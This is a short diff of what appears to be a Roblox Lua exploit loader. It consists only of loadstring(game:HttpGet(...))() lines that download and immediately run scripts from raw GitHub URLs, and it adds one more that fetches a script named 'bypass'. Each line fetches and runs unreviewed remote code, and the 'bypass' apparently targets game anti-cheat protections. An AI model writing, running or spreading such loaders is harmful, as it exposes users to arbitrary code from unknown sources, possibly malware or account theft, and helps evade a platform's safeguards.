@@ -1,3 +1,4 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/Kingr/main/Wee'))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/Yedi5/main/Oo4'))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/Brst/main/Yy'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/finngameandglitch/bypass/main/bypass'))()
